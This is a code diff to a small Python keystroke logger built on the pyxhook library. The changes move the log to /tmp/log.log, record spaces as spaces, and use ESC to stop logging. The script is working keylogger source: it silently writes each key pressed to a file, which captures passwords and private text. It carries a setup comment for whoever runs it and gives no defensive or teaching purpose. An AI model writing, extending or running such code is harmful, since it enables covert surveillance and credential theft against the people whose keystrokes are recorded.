@@ -1,14 +1,17 @@
 import pyxhook
 #change this to your log file's path
-log_file='file.log'
+log_file='/tmp/log.log'
 
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
   fob=open(log_file,'a')
-  fob.write(event.Key)
+  if (event.Key == 'space'):
+    fob.write(' ')
+  else:
+    fob.write(event.Key)
   #fob.write('\n')
 
-  if event.Ascii==96: #96 is the ascii value of the grave key (`)
+  if event.Ascii==27: #27 is the ascii value of ESC key
     fob.close()
     new_hook.cancel()
 #instantiate HookManager class
